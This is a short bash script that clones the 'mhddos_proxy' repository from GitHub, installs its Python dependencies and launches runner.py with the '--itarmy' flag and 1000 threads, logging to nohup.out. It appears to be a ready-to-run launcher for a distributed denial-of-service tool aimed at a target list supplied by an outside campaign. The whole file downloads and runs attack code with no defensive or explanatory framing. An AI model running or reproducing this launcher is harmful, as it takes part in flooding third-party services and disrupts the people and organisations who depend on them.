#!/usr/bin/env bash

export PY_BIN=/home/cabox/.pyenv/shims/python3
mkdir -p ~/workspace && \
cd ~/workspace && \
rm -rf mhddos_proxy && \
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git && \
cd mhddos_proxy && \
$PY_BIN -m pip install -r requirements.txt && \
$PY_BIN -m pip install uvloop
$PY_BIN runner.py --itarmy -t 1000  >> ~/workspace/mhddos_proxy/nohup.out 2>>~/workspace/mhddos_proxy/nohup.out